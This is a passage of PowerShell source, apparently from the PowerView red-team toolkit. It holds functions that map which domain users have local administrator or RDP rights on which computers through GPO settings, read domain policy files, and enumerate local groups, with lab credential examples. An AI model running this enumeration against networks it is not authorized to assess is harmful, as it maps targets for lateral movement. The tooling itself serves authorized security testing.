'')) {\n                            if ($Member -notmatch '^S-1-.*') {\n\n                                # if the resulting member is username and not a SID, attempt to resolve it\n                                $ConvertToArguments = @{'ObjectName' = $Groupname}\n                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }\n                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member\n\n                                if ($MemberSID) {\n                                    $GroupMembers += $MemberSID\n                                }\n                                else {\n                                    $GroupMembers += $Member\n                                }\n                            }\n                            else {\n                                $GroupMembers += $Member\n                            }\n                        }\n                    }\n                    $_.GroupMembers = $GroupMembers\n                }\n\n                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName\n                $_ | Add-Member Noteproperty 'GPOName' $GPOName\n                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'\n                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')\n                $_\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainGPOUserLocalGroupMapping {\n<#\n.SYNOPSIS\n\nEnumerates the machines where a specific domain user/group is a member of a specific\nlocal group, all through GPO correlation. If no user/group is specified, all\ndiscoverable mappings are returned.\n\nAuthor: @harmj0y  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  \n\n.DESCRIPTION\n\nTakes a user/group name and optional domain, and determines the computers in the domain\nthe user/group has local admin (or RDP) rights to.\n\nIt does this by:\n    1.  resolving the user/group to its proper SID\n    2.  enumerating all groups the user/group is a current part of\n        and extracting all target SIDs to build a target SID list\n    3.  pulling all GPOs that set 'Restricted Groups' or Groups.xml by calling\n        Get-DomainGPOLocalGroup\n    4.  matching the target SID list to the queried GPO SID list\n        to enumerate all GPO the user is effectively applied with\n    5.  enumerating all OUs and sites and applicable GPO GUIs are\n        applied to through gplink enumerating\n    6.  querying for all computers under the given OUs or sites\n\nIf no user/group is specified, all user/group -> machine mappings discovered through\nGPO relationships are returned.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the user/group to identity GPO local group mappings for.\n\n.PARAMETER LocalGroup\n\nThe local group to check access against.\nCan be \"Administrators\" (S-1-5-32-544), \"RDP/Remote Desktop Users\" (S-1-5-32-555),\nor a custom local SID. Defaults to local 'Administrators'.\n\n.PARAMETER Domain\n\nSpecifies the domain to enumerate GPOs for, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainGPOUserLocalGroupMapping\n\nFind all user/group -> machine relationships where the user/group is a member\nof the local administrators group on target machines.\n\n.EXAMPLE\n\nGet-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local\n\nFind all computers that dfm user has local administrator rights to in\nthe dev.testlab.local domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGPOUserLocalGroupMapping -Credential $Cred\n\n.OUTPUTS\n\nPowerView.GPOLocalGroupMapping\n\nA custom PSObject containing any target identity information and what local\ngroup memberships they're a part of through GPO correlation.\n\n.LINK\n\nhttp://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.GPOUserLocalGroupMapping')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String]\n        $Identity,\n\n        [String]\n        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]\n        $LocalGroup = 'Administrators',\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $CommonArguments = @{}\n        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        $TargetSIDs = @()\n\n        if ($PSBoundParameters['Identity']) {\n            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid\n            $TargetObjectSID = $TargetSIDs\n            if (-not $TargetSIDs) {\n                Throw \"[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'\"\n            }\n        }\n        else {\n            # no filtering/match all\n            $TargetSIDs = @('*')\n        }\n\n        if ($LocalGroup -match 'S-1-5') {\n            $TargetLocalSID = $LocalGroup\n        }\n        elseif ($LocalGroup -match 'Admin') {\n            $TargetLocalSID = 'S-1-5-32-544'\n        }\n        else {\n            # RDP\n            $TargetLocalSID = 'S-1-5-32-555'\n        }\n\n        if ($TargetSIDs[0] -ne '*') {\n            ForEach ($TargetSid in $TargetSids) {\n                Write-Verbose \"[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'\"\n                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid\n            }\n        }\n\n        Write-Verbose \"[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID\"\n        Write-Verbose \"[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs\"\n\n        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {\n            $GPOgroup = $_\n            # if the locally set group is what we're looking for, check the GroupMembers ('members') for our target SID\n            if ($GPOgroup.GroupSID -match $TargetLocalSID) {\n                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {\n                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {\n                        $GPOgroup\n                    }\n                }\n            }\n            # if the group is a 'memberof' the group we're looking for, check GroupSID against the targt SIDs\n            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {\n                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {\n                    $GPOgroup\n                }\n            }\n        } | Sort-Object -Property GPOName -Unique\n\n        $GPOgroups | Where-Object {$_} | ForEach-Object {\n            $GPOname = $_.GPODisplayName\n            $GPOguid = $_.GPOName\n            $GPOPath = $_.GPOPath\n            $GPOType = $_.GPOType\n            if ($_.GroupMembers) {\n                $GPOMembers = $_.GroupMembers\n            }\n            else {\n                $GPOMembers = $_.GroupSID\n            }\n\n            $Filters = $_.Filters\n\n            if ($TargetSIDs[0] -eq '*') {\n                # if the * wildcard was used, set the targets to all GPO members so everything it output\n                $TargetObjectSIDs = $GPOMembers\n            }\n            else {\n                $TargetObjectSIDs = $TargetObjectSID\n            }\n\n            # find any OUs that have this GPO linked through gpLink\n            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {\n                if ($Filters) {\n                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname\n                }\n                else {\n                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname\n                }\n\n                if ($OUComputers) {\n                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}\n\n                    ForEach ($TargetSid in $TargetObjectSIDs) {\n                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'\n\n                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype\n\n                        $GPOLocalGroupMapping = New-Object PSObject\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname\n                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers\n                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')\n                        $GPOLocalGroupMapping\n                    }\n                }\n            }\n\n            # find any sites that have this GPO linked through gpLink\n            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {\n                ForEach ($TargetSid in $TargetObjectSIDs) {\n                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'\n\n                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype\n\n                    $GPOLocalGroupMapping = New-Object PSObject\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname\n                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl\n                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')\n                    $GPOLocalGroupMapping\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainGPOComputerLocalGroupMapping {\n<#\n.SYNOPSIS\n\nTakes a computer (or GPO) object and determines what users/groups are in the specified\nlocal group for the machine through GPO correlation.\n\nAuthor: @harmj0y  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  \n\n.DESCRIPTION\n\nThis function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups\nare in the specified local group for a target machine through GPO correlation.\n\nIf a -ComputerIdentity is specified, retrieve the complete computer object, attempt to\ndetermine the OU the computer is a part of. Then resolve the computer's site name with\nGet-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to\nenumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For\neach resulting GPO group, resolve the resulting user/group name to a full AD object and\nreturn the results. This will return the domain objects that are members of the specified\n-LocalGroup for the given computer.\n\nOtherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and\nlocalgroup specifications.\n\n.PARAMETER ComputerIdentity\n\nA SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),\nor a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.\n\n.PARAMETER OUIdentity\n\nAn OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or\nGUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.\n\n.PARAMETER LocalGroup\n\nThe local group to check access against.\nCan be \"Administrators\" (S-1-5-32-544), \"RDP/Remote Desktop Users\" (S-1-5-32-555),\nor a custom local SID. Defaults to local 'Administrators'.\n\n.PARAMETER Domain\n\nSpecifies the domain to enumerate GPOs for, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local\n\nFinds users who have local admin rights over WINDOWS3 through GPO correlation.\n\n.EXAMPLE\n\nGet-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP\n\nFinds users who have RDP rights over WINDOWS4 through GPO correlation.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local\n\n.OUTPUTS\n\nPowerView.GGPOComputerLocalGroupMember\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.GGPOComputerLocalGroupMember')]\n    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]\n    Param(\n        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]\n        [String]\n        $ComputerIdentity,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]\n        [Alias('OU')]\n        [String]\n        $OUIdentity,\n\n        [String]\n        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]\n        $LocalGroup = 'Administrators',\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $CommonArguments = @{}\n        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['ComputerIdentity']) {\n            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'\n\n            if (-not $Computers) {\n                throw \"[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name.\"\n            }\n\n            ForEach ($Computer in $Computers) {\n\n                $GPOGuids = @()\n\n                # extract any GPOs linked to this computer's OU through gpLink\n                $DN = $Computer.distinguishedname\n                $OUIndex = $DN.IndexOf('OU=')\n                if ($OUIndex -gt 0) {\n                    $OUName = $DN.SubString($OUIndex)\n                }\n                if ($OUName) {\n                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {\n                        Select-String -InputObject $_.gplink -Pattern '(\\{){0,1}[0-9a-fA-F]{8}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{12}(\\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }\n                    }\n                }\n\n                # extract any GPOs linked to this computer's site through gpLink\n                Write-Verbose \"Enumerating the sitename for: $($Computer.dnshostname)\"\n                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName\n                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {\n                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {\n                        Select-String -InputObject $_.gplink -Pattern '(\\{){0,1}[0-9a-fA-F]{8}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{4}\\-[0-9a-fA-F]{12}(\\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }\n                    }\n                }\n\n                # process any GPO local group settings from the GPO GUID set\n                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {\n                    $GPOGroup = $_\n\n                    if($GPOGroup.GroupMembers) {\n                        $GPOMembers = $GPOGroup.GroupMembers\n                    }\n                    else {\n                        $GPOMembers = $GPOGroup.GroupSID\n                    }\n\n                    $GPOMembers | ForEach-Object {\n                        $Object = Get-DomainObject @CommonArguments -Identity $_\n                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype\n\n                        $GPOComputerLocalGroupMember = New-Object PSObject\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath\n                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType\n                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')\n                        $GPOComputerLocalGroupMember\n                    }\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainPolicyData {\n<#\n.SYNOPSIS\n\nReturns the default domain policy or the domain controller policy for the current\ndomain or a specified domain/domain controller.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  \n\n.DESCRIPTION\n\nReturns the default domain policy or the domain controller policy for the current\ndomain or a specified domain/domain controller using Get-DomainGPO.\n\n.PARAMETER Domain\n\nThe domain to query for default policies, defaults to the current domain.\n\n.PARAMETER Policy\n\nExtract 'Domain', 'DC' (domain controller) policies, or 'All' for all policies.\nOtherwise queries for the particular GPO name or GUID.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainPolicyData\n\nReturns the default domain policy for the current domain.\n\n.EXAMPLE\n\nGet-DomainPolicyData -Domain dev.testlab.local\n\nReturns the default domain policy for the dev.testlab.local domain.\n\n.EXAMPLE\n\nGet-DomainGPO | Get-DomainPolicy\n\nParses any GptTmpl.infs found for any policies in the current domain.\n\n.EXAMPLE\n\nGet-DomainPolicyData -Policy DC -Domain dev.testlab.local\n\nReturns the policy for the dev.testlab.local domain controller.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainPolicyData -Credential $Cred\n\n.OUTPUTS\n\nHashtable\n\nOuputs a hashtable representing the parsed GptTmpl.inf file.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([Hashtable])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Source', 'Name')]\n        [String]\n        $Policy = 'Domain',\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        $ConvertArguments = @{}\n        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Domain']) {\n            $SearcherArguments['Domain'] = $Domain\n            $ConvertArguments['Domain'] = $Domain\n        }\n\n        if ($Policy -eq 'All') {\n            $SearcherArguments['Identity'] = '*'\n        }\n        elseif ($Policy -eq 'Domain') {\n            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'\n        }\n        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {\n            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'\n        }\n        else {\n            $SearcherArguments['Identity'] = $Policy\n        }\n\n        $GPOResults = Get-DomainGPO @SearcherArguments\n\n        ForEach ($GPO in $GPOResults) {\n            # grab the GptTmpl.inf file and parse it\n            $GptTmplPath = $GPO.gpcfilesyspath + \"\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\"\n\n            $ParseArgs =  @{\n                'GptTmplPath' = $GptTmplPath\n                'OutputObject' = $True\n            }\n            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }\n\n            # parse the GptTmpl.inf\n            Get-GptTmpl @ParseArgs | ForEach-Object {\n                $_ | Add-Member Noteproperty 'GPOName' $GPO.name\n                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname\n                $_\n            }\n        }\n    }\n}\n\n\n########################################################\n#\n# Functions that enumerate a single host, either through\n# WinNT, WMI, remote registry, or API calls\n# (with PSReflect).\n#\n########################################################\n\nfunction Get-NetLocalGroup {\n<#\n.SYNOPSIS\n\nEnumerates the local groups on the local (or remote) machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect  \n\n.DESCRIPTION\n\nThis function will enumerate the names and descriptions for the\nlocal groups on the current, or remote, machine. By default, the Win32 API\ncall NetLocalGroupEnum will be used (for speed). Specifying \"-Method WinNT\"\ncauses the WinNT service provider to be used instead, which returns group\nSIDs along with the group names and descriptions/comments.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for sessions (also accepts IP addresses).\nDefaults to the localhost.\n\n.PARAMETER Method\n\nThe collection method to use, defaults to 'API', also accepts 'WinNT'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to a remote machine. Only applicable with \"-Method WinNT\".\n\n.EXAMPLE\n\nGet-NetLocalGroup\n\nComputerName                  GroupName                     Comment\n------------                  ---------                     -------\nWINDOWS1                      Administrators                Administrators have comple...\nWINDOWS1                      Backup Operators              Backup Operators can overr...\nWINDOWS1                      Cryptographic Operators       Members are authorized to ...\n...\n\n.EXAMPLE\n\nGet-NetLocalGroup -Method Winnt\n\nComputerName           GroupName              GroupSID              Comment\n------------           ---------              --------              -------\nWINDOWS1               Administrators         S-1-5-32-544          Administrators hav...\nWINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...\nWINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...\n...\n\n.EXAMPLE\n\nGet-NetLocalGroup -ComputerName primary.testlab.local\n\nComputerName                  GroupName                     Comment\n------------                  ---------                     -------\nprimary.testlab.local         Administrators                Administrators have comple...\nprimary.testlab.local         Users                         Users are prevented from m...\nprimary.testlab.local         Guests                        Guests have the same acces...\nprimary.testlab.local         Print Operators               Members can administer dom...\nprimary.testlab.local         Backup Operators              Backup Operators can overr...\n\n.OUTPUTS\n\nPowerView.LocalGroup.API\n\nCustom PSObject with translated group property fields from API results.\n\nPowerView.LocalGroup.WinNT\n\nCustom PSObject with translated group property fields from WinNT results.\n\n.LINK\n\nhttps://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.LocalGroup.API')]\n    [OutputType('PowerView.LocalGroup.WinNT')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = $Env:COMPUTERNAME,\n\n        [ValidateSet('API', 'WinNT')]\n        [Alias('CollectionMethod')]\n        [String]\n        $Method = 'API',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            if ($Method -eq 'API') {\n                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information\n\n                # arguments for NetLocalGroupEnum\n                $QueryLevel = 1\n                $PtrInfo = [IntPtr]::Zero\n                $EntriesRead = 0\n                $TotalRead = 0\n                $ResumeHandle = 0\n\n                # get the local user information\n                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, 